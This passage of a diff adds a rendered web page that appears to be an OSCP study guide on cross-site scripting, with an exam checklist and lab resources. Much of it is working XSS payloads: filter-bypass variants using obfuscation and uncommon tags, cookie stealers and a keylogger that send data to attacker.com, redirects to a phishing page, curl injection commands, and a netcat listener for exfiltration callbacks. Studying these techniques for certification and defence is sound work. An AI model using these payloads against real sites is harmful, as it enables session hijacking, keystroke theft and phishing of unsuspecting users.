+</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">\u0061lert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nx">atob</span><span class="p">(</span><span class="s1">&#39;YWxlcnQoMSk=&#39;</span><span class="p">))&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="2-mixed-case">2. Mixed Case</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a><span class="p">&lt;</span><span class="nt">ScRiPt</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">sCrIpT</span><span class="p">&gt;</span>
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a><span class="p">&lt;</span><span class="nt">iMg</span> <span class="na">sRc</span><span class="o">=</span><span class="s">x</span> <span class="na">oNeRrOr</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="3-uncommon-tags">3. Uncommon Tags</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a><span class="p">&lt;</span><span class="nt">details</span> <span class="na">open</span> <span class="na">ontoggle</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a><span class="p">&lt;</span><span class="nt">marquee</span> <span class="na">onstart</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>XSS<span class="p">&lt;/</span><span class="nt">marquee</span><span class="p">&gt;</span>
+</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a><span class="p">&lt;</span><span class="nt">isindex</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">image</span><span class="p">&gt;</span>
+</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a><span class="p">&lt;</span><span class="nt">form</span><span class="p">&gt;&lt;</span><span class="nt">button</span> <span class="na">formaction</span><span class="o">=</span><span class="s">javascript:alert(1)</span><span class="p">&gt;</span>Click
+</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a><span class="p">&lt;</span><span class="nt">object</span> <span class="na">data</span><span class="o">=</span><span class="s">&quot;javascript:alert(1)&quot;</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="4-obfuscation">4. Obfuscation</h3>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">eval</span><span class="p">(</span><span class="nb">String</span><span class="p">.</span><span class="nx">fromCharCode</span><span class="p">(</span><span class="mf">97</span><span class="p">,</span><span class="mf">108</span><span class="p">,</span><span class="mf">101</span><span class="p">,</span><span class="mf">114</span><span class="p">,</span><span class="mf">116</span><span class="p">,</span><span class="mf">40</span><span class="p">,</span><span class="mf">49</span><span class="p">,</span><span class="mf">41</span><span class="p">))</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-49-2"><a id="__codelineno-49-2" name="__codelineno-49-2" href="#__codelineno-49-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">setTimeout</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">,</span><span class="mf">0</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-49-3"><a id="__codelineno-49-3" name="__codelineno-49-3" href="#__codelineno-49-3"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">setInterval</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">,</span><span class="mf">1000</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-49-4"><a id="__codelineno-49-4" name="__codelineno-49-4" href="#__codelineno-49-4"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="p">[].</span><span class="kr">constructor</span><span class="p">.</span><span class="kr">constructor</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">)()</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="quick-payload-reference">Quick Payload Reference</h2>
+<h3 id="shortest-payloads">Shortest Payloads</h3>
+<div class="language-html highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="mf">1</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a><span class="p">&lt;</span><span class="nt">svg</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">x</span> <span class="na">onerror</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a><span class="p">&lt;</span><span class="nt">body</span> <span class="na">onload</span><span class="o">=</span><span class="s">alert(1)</span><span class="p">&gt;</span>
+</span><span id="__span-50-5"><a id="__codelineno-50-5" name="__codelineno-50-5" href="#__codelineno-50-5"></a><span class="p">&lt;</span><span class="nt">iframe</span> <span class="na">src</span><span class="o">=</span><span class="s">javascript:alert(1)</span><span class="p">&gt;</span>
+</span></code></pre></div>
+<h3 id="cookie-stealers">Cookie Stealers</h3>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="ow">new</span><span class="w"> </span><span class="nx">Image</span><span class="p">().</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://attacker.com/?c=&#39;</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a><span class="o">&lt;</span><span class="nx">img</span><span class="w"> </span><span class="nx">src</span><span class="o">=</span><span class="nx">x</span><span class="w"> </span><span class="nx">onerror</span><span class="o">=</span><span class="k">this</span><span class="p">.</span><span class="nx">src</span><span class="o">=</span><span class="s1">&#39;http://attacker.com/?c=&#39;</span><span class="o">+</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="o">&gt;</span>
+</span></code></pre></div>
+<h3 id="keyloggers">Keyloggers</h3>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">onkeypress</span><span class="o">=</span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">){</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/?k=&#39;</span><span class="o">+</span><span class="nx">e</span><span class="p">.</span><span class="nx">key</span><span class="p">)}</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span></code></pre></div>
+<h3 id="page-redirectors">Page Redirectors</h3>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">window</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://attacker.com&#39;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="s1">&#39;http://attacker.com/phish.html&#39;</span><span class="o">&lt;</span><span class="err">/script&gt;</span>
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a><span class="o">&lt;</span><span class="nx">meta</span><span class="w"> </span><span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;refresh&quot;</span><span class="w"> </span><span class="nx">content</span><span class="o">=</span><span class="s2">&quot;0;url=http://attacker.com&quot;</span><span class="o">&gt;</span>
+</span></code></pre></div>
+<hr />
+<h2 id="oscp-exam-strategy">OSCP Exam Strategy</h2>
+<h3 id="time-management">Time Management</h3>
+<ul>
+<li><strong>5 min</strong>: Identify all input points</li>
+<li><strong>10 min</strong>: Test basic XSS payloads</li>
+<li><strong>15 min</strong>: Bypass filters if needed</li>
+<li><strong>10 min</strong>: Craft working exploit</li>
+<li><strong>10 min</strong>: Document for report</li>
+</ul>
+<h3 id="checklist-during-exam">Checklist During Exam</h3>
+<ol>
+<li><strong>Initial Testing</strong></li>
+<li>[ ] Test all GET parameters</li>
+<li>[ ] Test all POST parameters  </li>
+<li>[ ] Test search functionality</li>
+<li>[ ] Test comment sections</li>
+<li>
+<p>[ ] Test user profile fields</p>
+</li>
+<li>
+<p><strong>Context Detection</strong></p>
+</li>
+<li>[ ] View page source</li>
+<li>[ ] Find where input is reflected</li>
+<li>[ ] Determine context (HTML/JS/attribute)</li>
+<li>
+<p>[ ] Note any encoding/filtering</p>
+</li>
+<li>
+<p><strong>Exploitation</strong></p>
+</li>
+<li>[ ] Start with simple <code>alert(1)</code></li>
+<li>[ ] If blocked, try bypass techniques</li>
+<li>[ ] Craft final payload</li>
+<li>[ ] Test payload works</li>
+<li>
+<p>[ ] Capture evidence (screenshots)</p>
+</li>
+<li>
+<p><strong>Documentation</strong></p>
+</li>
+<li>[ ] Save payload that worked</li>
+<li>[ ] Screenshot showing XSS execution</li>
+<li>[ ] Note injection point</li>
+<li>[ ] Document steps to reproduce</li>
+</ol>
+<h3 id="pro-tips-for-oscp">Pro Tips for OSCP</h3>
+<div class="admonition tip">
+<p class="admonition-title">Quick Wins</p>
+<ul>
+<li>Always try <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> first</li>
+<li>If filtered, immediately try <code>&lt;img src=x onerror=alert(1)&gt;</code></li>
+<li>Check if input is reflected in multiple places</li>
+<li>Test URL parameters even if no visible input field</li>
+<li>Don't spend too long on one XSS - move on if stuck</li>
+</ul>
+</div>
+<div class="admonition warning">
+<p class="admonition-title">Common Mistakes</p>
+<ul>
+<li>Not URL-encoding payloads in GET parameters</li>
+<li>Forgetting to check where input is reflected</li>
+<li>Not testing all input fields</li>
+<li>Giving up too early on filter bypass</li>
+<li>Not documenting findings properly</li>
+</ul>
+</div>
+<div class="admonition danger">
+<p class="admonition-title">Exam Restrictions</p>
+<ul>
+<li>Don't attack other students</li>
+<li>Only test on your assigned targets</li>
+<li>Keep payloads non-destructive</li>
+<li>Document everything for the report</li>
+</ul>
+</div>
+<hr />
+<h2 id="practice-resources">Practice Resources</h2>
+<h3 id="online-labs">Online Labs</h3>
+<ul>
+<li><strong>PortSwigger Web Security Academy</strong> - XSS labs (free)</li>
+<li><strong>HackTheBox</strong> - Web challenges</li>
+<li><strong>PentesterLab</strong> - XSS exercises</li>
+<li><strong>OWASP WebGoat</strong> - Practice environment</li>
+</ul>
+<h3 id="payload-lists">Payload Lists</h3>
+<ul>
+<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection">PayloadsAllTheThings XSS</a></li>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet">XSS Cheat Sheet - PortSwigger</a></li>
+<li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet">OWASP XSS Filter Evasion</a></li>
+</ul>
+<hr />
+<h2 id="summary">Summary</h2>
+<h3 id="remember">Remember:</h3>
+<ol>
+<li><strong>Test every input</strong> - forms, URLs, headers</li>
+<li><strong>Understand context</strong> - HTML, attribute, JavaScript</li>
+<li><strong>Start simple</strong> - <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></li>
+<li><strong>Bypass filters</strong> - encoding, case, alternative tags</li>
+<li><strong>Exploit effectively</strong> - steal cookies, hijack sessions</li>
+<li><strong>Document thoroughly</strong> - screenshots and steps</li>
+</ol>
+<h3 id="quick-command-reference">Quick Command Reference</h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a><span class="c1"># Basic test</span>
+</span><span id="__span-54-2"><a id="__codelineno-54-2" name="__codelineno-54-2" href="#__codelineno-54-2"></a>curl<span class="w"> </span><span class="s2">&quot;http://target.com/page?id=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>
+</span><span id="__span-54-3"><a id="__codelineno-54-3" name="__codelineno-54-3" href="#__codelineno-54-3"></a>
+</span><span id="__span-54-4"><a id="__codelineno-54-4" name="__codelineno-54-4" href="#__codelineno-54-4"></a><span class="c1"># POST request</span>
+</span><span id="__span-54-5"><a id="__codelineno-54-5" name="__codelineno-54-5" href="#__codelineno-54-5"></a>curl<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://target.com/comment<span class="w"> </span>-d<span class="w"> </span><span class="s2">&quot;text=&lt;img src=x onerror=alert(1)&gt;&quot;</span>
+</span><span id="__span-54-6"><a id="__codelineno-54-6" name="__codelineno-54-6" href="#__codelineno-54-6"></a>
+</span><span id="__span-54-7"><a id="__codelineno-54-7" name="__codelineno-54-7" href="#__codelineno-54-7"></a><span class="c1"># Custom header</span>
+</span><span id="__span-54-8"><a id="__codelineno-54-8" name="__codelineno-54-8" href="#__codelineno-54-8"></a>curl<span class="w"> </span>-H<span class="w"> </span><span class="s2">&quot;User-Agent: &lt;script&gt;alert(1)&lt;/script&gt;&quot;</span><span class="w"> </span>http://target.com
+</span><span id="__span-54-9"><a id="__codelineno-54-9" name="__codelineno-54-9" href="#__codelineno-54-9"></a>
+</span><span id="__span-54-10"><a id="__codelineno-54-10" name="__codelineno-54-10" href="#__codelineno-54-10"></a><span class="c1"># Start HTTP server for exfiltration</span>
+</span><span id="__span-54-11"><a id="__codelineno-54-11" name="__codelineno-54-11" href="#__codelineno-54-11"></a>python3<span class="w"> </span>-m<span class="w"> </span>http.server<span class="w"> </span><span class="m">80</span>
+</span><span id="__span-54-12"><a id="__codelineno-54-12" name="__codelineno-54-12" href="#__codelineno-54-12"></a>
+</span><span id="__span-54-13"><a id="__codelineno-54-13" name="__codelineno-54-13" href="#__codelineno-54-13"></a><span class="c1"># Listen for callbacks</span>
+</span><span id="__span-54-14"><a id="__codelineno-54-14" name="__codelineno-54-14" href="#__codelineno-54-14"></a>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">80</span>
+</span></code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "content.code.annotate"], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.92b07e13.min.js"></script>
+      
+    
+  </body>
+</html>
